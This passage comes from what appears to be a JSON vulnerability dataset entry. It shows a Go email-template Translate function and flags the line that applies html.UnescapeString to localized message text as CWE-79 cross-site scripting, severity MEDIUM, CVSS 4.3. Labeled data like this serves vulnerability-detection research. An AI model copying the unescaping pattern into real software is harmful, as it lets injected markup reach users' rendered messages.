        "func (data *TemplateData) Translate(translator *i18n.Translator, msgType string, args map[string]interface{}, langs ...string) {\n\tdata.Title = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageTitle), args, langs...)\n\tdata.PreHeader = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessagePreHeader), args, langs...)\n\tdata.Subject = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageSubject), args, langs...)\n\tdata.Greeting = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageGreeting), args, langs...)\n\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))\n\tdata.ButtonText = translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageButtonText), args, langs...)\n\t// Footer text is neither included in i18n files nor defaults.yaml\n\tfooterText := fmt.Sprintf(\"%s.%s\", msgType, domain.MessageFooterText)\n\tdata.FooterText = translator.Localize(footerText, args, langs...)\n\t// translator returns the id of the string to be translated if no translation is found for that id\n\t// we'll include the footer if we have a custom non-empty string and if the string doesn't include the\n\t// id of the string that could not be translated example InitCode.Footer\n\tdata.IncludeFooter = len(data.FooterText) > 0 && data.FooterText != footerText\n}"
      ],
      "hunk_level": [
        {
          "line_no": 43,
          "content": "\tdata.Text = html.UnescapeString(translator.Localize(fmt.Sprintf(\"%s.%s\", msgType, domain.MessageText), args, langs...))"
        }
      ]
    },
    "cwe": [
      "CWE-79"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.3,
    "cvss_version": 3.1
  }
]